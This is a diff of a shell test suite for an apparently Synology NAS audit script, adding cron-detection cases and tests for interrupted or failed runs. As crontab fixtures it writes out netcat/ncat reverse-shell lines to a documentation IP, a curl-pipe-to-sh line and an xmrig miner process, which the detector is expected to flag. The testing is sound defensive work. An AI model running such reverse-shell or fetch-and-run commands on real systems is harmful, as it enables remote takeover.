@@ -203,6 +203,16 @@ good_dsm cron_curl_sh; printf '* * * * * root curl http://x.example/a | sh\n' > 
 expect_rc 3; expect_has 'CRIT\] IOC-SCHEDULE'
 good_dsm cron_clean; printf '0 0 * * * root /usr/syno/bin/synoschedtask --run id=1\n' > "$D/etc/crontab"; run
 expect_rc 0; expect_has 'OK \] SCHEDULE'
+# rsync ends in "nc": its -e option must not read as "nc -e" (a reverse shell).
+good_dsm cron_rsync_e
+printf '0 2 * * * root rsync -e ssh /volume1/data backup@host:/b\n30 2 * * * root rsync -avhe "ssh -p 2222" /volume1/photo nas2:/volume1/photo\n15 3 * * * root /usr/bin/sync -c\n' > "$D/etc/crontab"; run
+expect_rc 0; expect_has 'OK \] SCHEDULE'; expect_not 'IOC-SCHEDULE'
+good_dsm cron_nc_e; printf '* * * * * root nc -e /bin/sh 203.0.113.5 4444\n' > "$D/etc/crontab"; run
+expect_rc 3; expect_has 'CRIT\] IOC-SCHEDULE'
+good_dsm cron_ncat_path; printf '* * * * * root /usr/local/bin/ncat -c sh 203.0.113.5 4444\n' > "$D/etc/crontab"; run
+expect_rc 3; expect_has 'CRIT\] IOC-SCHEDULE'
+good_dsm cron_nc_after_semicolon; printf '* * * * * root true;nc -ve /bin/sh 203.0.113.5 4444\n' > "$D/etc/crontab"; run
+expect_rc 3; expect_has 'CRIT\] IOC-SCHEDULE'
 good_dsm miner_proc
 printf 'USER PID COMMAND\nroot 1 /sbin/init\nnobody 999 /tmp/xmrig --donate-level 1\n' > "$D/_ps"; run
 expect_rc 3; expect_has 'CRIT\] IOC-PROCESS'
@@ -363,6 +373,47 @@ run
 expect_has 'SSH is enabled'; expect_has 'WARN\] TELNET'
 good_dsm mock_absent; run
 expect_has 'OK \] SSH: SSH is not running'; expect_not 'TELNET'
+
+# ------------------------------------------------------- interrupted run
+# A signal during the file sweep must end the run with no verdict. The mock
+# find marks that the sweep has started, then stalls. (SIGINT cannot be sent
+# to a background job of a non-interactive shell, so TERM and HUP stand in.)
+good_dsm interrupted 7.2.1 69057 1
+mkdir -p "$D/volume1" "$D/_slow"
+printf '#!/bin/sh\n: > "%s/_started"\nsleep 2\n' "$D" > "$D/_slow/find"
+chmod +x "$D/_slow/find"
+for sig in TERM HUP; do
+  CASE="interrupted_$sig"
+  rm -f "$D/_started"
+  SYNOLOGY_AUDIT_TEST_ROOT="$D" SYNOLOGY_AUDIT_TEST_PATH="$D/_slow:$MOCK_BIN" "$SH" "$SCRIPT" > "$D/_out" 2>&1 &
+  pid=$!
+  n=0
+  while [ ! -e "$D/_started" ] && [ "$n" -lt 50 ]; do sleep 0.1; n=$((n + 1)); done
+  kill -s "$sig" "$pid"
+  wait "$pid"; RC=$?
+  OUT=$(cat "$D/_out")
+  case "$sig" in TERM) expect_rc 143 ;; HUP) expect_rc 129 ;; esac
+  expect_not 'Verdict'; expect_not 'critical'
+done
+
+# Findings lost while the audit runs (here the mock find removes the temp
+# directory, which a mock mktemp put in a known place): UNKNOWN, never OK.
+good_dsm findings_lost 7.2.1 69057 1
+mkdir -p "$D/volume1" "$D/_lost"
+printf '#!/bin/sh\nmkdir -p "%s/_work" && echo "%s/_work"\n' "$D" "$D" > "$D/_lost/mktemp"
+printf '#!/bin/sh\nrm -rf "%s/_work"\n' "$D" > "$D/_lost/find"
+chmod +x "$D/_lost/mktemp" "$D/_lost/find"
+for mode in "" --quiet --json; do
+  CASE="findings_lost${mode:+_${mode#--}}"
+  # shellcheck disable=SC2086  # $mode is empty or one option
+  OUT=$(SYNOLOGY_AUDIT_TEST_ROOT="$D" SYNOLOGY_AUDIT_TEST_PATH="$D/_lost:$MOCK_BIN" "$SH" "$SCRIPT" $mode 2>&1); RC=$?
+  expect_rc 4; expect_not 'Verdict: OK'; expect_not '"verdict":"OK"'
+  case "$mode" in
+    --quiet) expect_has '^UNKNOWN ' ;;
+    --json)  expect_has '"verdict":"UNKNOWN"' ;;
+    *)       expect_has 'no verdict' ;;
+  esac
+done
 
 # -------------------------------------------------- test hooks vs. real root
 # In a user namespace mapped to uid 0, id -u reports 0: the script must then
